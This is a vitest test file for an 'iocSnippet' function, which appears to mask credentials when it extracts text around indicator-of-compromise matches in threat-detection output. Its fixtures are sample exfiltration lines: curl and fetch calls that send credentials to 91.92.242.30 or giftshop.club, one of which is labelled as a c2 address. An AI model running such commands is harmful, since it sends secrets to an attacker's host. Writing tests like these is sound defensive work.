import { describe, expect, it } from 'vitest';
import { iocSnippet } from './snippet.js';
import { domainBoundaryRegex, ipBoundaryRegex } from './boundary.js';

const SECRET = 'Zp9Yx8Wq7Vr6Ut5Sr4Qp3';
const pad = (s: string) => `${'x'.repeat(200)} ${s} ${'y'.repeat(200)}`;

describe('iocSnippet', () => {
  it.each([
    [`fetch("https://administrator-account:${SECRET}@91.92.242.30/x")`, ipBoundaryRegex('91.92.242.30')],
    [`"postgres://svc_reporting_readonly:${SECRET}@91.92.242.30:5432/db"`, ipBoundaryRegex('91.92.242.30')],
    [`curl -u deploy_automation_user:${SECRET} https://giftshop.club/up`, domainBoundaryRegex('giftshop.club')],
    [`{"db_password":"${SECRET}","f":"","c2":"91.92.242.30"}`, ipBoundaryRegex('91.92.242.30')],
    [`export DB_PASSWORD=${SECRET}; F=; curl http://91.92.242.30/x`, ipBoundaryRegex('91.92.242.30')],
  ])('masks the credential before cutting the window: %s', (line, re) => {
    const out = iocSnippet(pad(line), re);
    expect(out).not.toContain(SECRET);
    expect(out).toMatch(re);
  });
});

describe('iocSnippet — long lines', () => {
  it('stays fast on a long line of flag-shaped text and still masks around the match', () => {
    const line = '-p x '.repeat(160_000) + `curl -u deploy:${SECRET} https://giftshop.club/up ` + '-p x '.repeat(10_000);
    const start = Date.now();
    const out = iocSnippet(line, domainBoundaryRegex('giftshop.club'));
    expect(Date.now() - start).toBeLessThan(2_000);
    expect(out).toContain('giftshop.club');
    expect(out).not.toContain(SECRET);
  });
});
